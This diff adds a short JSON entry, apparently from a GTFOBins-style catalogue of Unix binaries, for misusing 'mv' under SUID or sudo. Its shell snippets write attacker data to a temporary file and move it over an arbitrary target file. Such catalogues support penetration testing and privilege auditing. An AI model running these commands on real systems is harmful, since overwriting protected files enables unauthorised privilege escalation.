@@ -1,0 +1,15 @@
+{
+  "description": "This can be used to move and then read or write files from a restricted file systems or with elevated privileges.",
+  "functions": {
+    "suid": [
+      {
+        "code": "TF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF [file]\n"
+      }
+    ]
+  }
+}
